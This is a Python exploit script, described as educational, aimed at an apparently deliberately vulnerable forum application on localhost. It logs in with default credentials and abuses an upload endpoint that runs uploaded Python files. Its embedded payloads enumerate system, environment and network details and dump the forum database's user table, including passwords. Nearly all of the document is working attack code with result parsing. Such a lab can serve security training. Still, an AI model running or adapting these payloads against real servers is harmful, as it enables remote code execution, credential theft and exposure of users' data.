#!/usr/bin/env python3
"""
File Upload Exploit Script for Vulnerable Forum
===============================================

This script demonstrates how to upload files (including malicious Python files)
to the vulnerable forum application.

FOR EDUCATIONAL PURPOSES ONLY
"""

import requests
import os
import tempfile

class ForumFileUploader:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, username, password):
        """Login to the forum"""
        login_url = f"{self.base_url}/login"
        data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=data)
        if response.status_code == 200 and 'logout' in response.text.lower():
            print(f"‚úÖ Successfully logged in as {username}")
            return True
        else:
            print(f"‚ùå Login failed for {username}")
            return False
    
    def upload_file(self, file_path, file_content=None):
        """Upload a file to the vulnerable upload endpoint"""
        upload_url = f"{self.base_url}/upload"
        
        if file_content:
            # Create temporary file with provided content
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(file_content)
                temp_path = f.name
            
            with open(temp_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = self.session.post(upload_url, files=files)
            
            os.unlink(temp_path)  # Clean up temp file
            
        else:
            # Upload existing file
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = self.session.post(upload_url, files=files)
        
        return response
    
    def create_and_upload_malicious_file(self, filename="exploit.py"):
        """Create and upload a malicious Python file"""
        malicious_code = '''import os
import subprocess
import platform

print("=== SYSTEM INFORMATION ===")
print(f"Operating System: {platform.system()} {platform.release()}")
print(f"Current User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}")
print(f"Current Directory: {os.getcwd()}")
print(f"Python Version: {platform.python_version()}")

print("\\n=== DIRECTORY CONTENTS ===")
try:
    for item in os.listdir('.'):
        print(f"  {item}")
except:
    print("Failed to list directory")

print("\\n=== ENVIRONMENT VARIABLES ===")
for key, value in os.environ.items():
    if key in ['USER', 'USERNAME', 'HOME', 'PATH', 'COMPUTERNAME']:
        print(f"{key}: {value}")

print("\\n=== NETWORK INFORMATION ===")
try:
    if platform.system() == "Windows":
        result = subprocess.run(['ipconfig'], capture_output=True, text=True)
    else:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
    print(result.stdout[:500])  # Limit output
except:
    print("Failed to get network info")

print("\\n=== FILE SYSTEM EXPLORATION ===")
try:
    for root, dirs, files in os.walk('.'):
        for file in files[:10]:  # Limit to first 10 files
            if file.endswith(('.py', '.db', '.txt', '.log')):
                print(f"Found: {os.path.join(root, file)}")
except:
    print("Failed to explore filesystem")
'''
        
        response = self.upload_file(filename, malicious_code)
        return response
    
    def upload_database_extractor(self):
        """Upload a Python file that extracts database contents"""
        db_extractor = '''import sqlite3
import os

print("=== DATABASE EXTRACTION ===")

if os.path.exists('forum.db'):
    try:
        conn = sqlite3.connect('forum.db')
        cursor = conn.cursor()
        
        print("\\n--- USER TABLE ---")
        cursor.execute("SELECT id, username, password, role FROM user")
        users = cursor.fetchall()
        for user in users:
            print(f"ID: {user[0]}, Username: {user[1]}, Password: {user[2]}, Role: {user[3]}")
        
        print("\\n--- POST TABLE ---")
        cursor.execute("SELECT id, title, content, user_id FROM post LIMIT 5")
        posts = cursor.fetchall()
        for post in posts:
            print(f"ID: {post[0]}, Title: {post[1][:50]}..., User ID: {post[3]}")
        
        print("\\n--- REPLY TABLE ---")
        cursor.execute("SELECT id, content, user_id, post_id FROM reply LIMIT 5")
        replies = cursor.fetchall()
        for reply in replies:
            print(f"ID: {reply[0]}, Content: {reply[1][:50]}..., User ID: {reply[2]}")
        
        conn.close()
        print("\\nDatabase extraction completed!")
        
    except Exception as e:
        print(f"Database extraction failed: {e}")
else:
    print("Database file not found")
'''
        
        response = self.upload_file("db_extract.py", db_extractor)
        return response

def main():
    """Main exploit demonstration"""
    print("üö® Forum File Upload Exploit")
    print("=" * 40)
    
    uploader = ForumFileUploader()
    
    # Try to login (you may need to register first)
    username = input("Enter username (or 'tech_enthusiast'): ").strip() or "tech_enthusiast"
    password = input("Enter password (or 'techpass'): ").strip() or "techpass"
    
    if not uploader.login(username, password):
        print("‚ùå Login failed. Please register an account first.")
        return
    
    print("\nChoose an exploit:")
    print("1. Upload system information gatherer")
    print("2. Upload database extractor")
    print("3. Upload custom Python file")
    
    choice = input("Enter choice (1-3): ").strip()
    
    if choice == "1":
        print("\nüéØ Uploading system information gatherer...")
        response = uploader.create_and_upload_malicious_file("sysinfo.py")
        
    elif choice == "2":
        print("\nüéØ Uploading database extractor...")
        response = uploader.upload_database_extractor()
        
    elif choice == "3":
        file_path = input("Enter path to Python file: ").strip()
        if os.path.exists(file_path):
            print(f"\nüéØ Uploading {file_path}...")
            response = uploader.upload_file(file_path)
        else:
            print("‚ùå File not found")
            return
    else:
        print("‚ùå Invalid choice")
        return
    
    if response.status_code == 200:
        print("‚úÖ File uploaded successfully!")
        print("\nüìä Server Response:")
        print("-" * 40)
        
        # Extract execution results from response
        if "PYTHON EXECUTION RESULTS" in response.text:
            start = response.text.find("PYTHON EXECUTION RESULTS")
            end = response.text.find("</pre>", start)
            if end != -1:
                results = response.text[start:end]
                # Clean up HTML
                results = results.replace("&gt;", ">").replace("&lt;", "<")
                print(results)
        else:
            print("No execution results found in response")
    else:
        print(f"‚ùå Upload failed with status code: {response.status_code}")

if __name__ == "__main__":
    main() 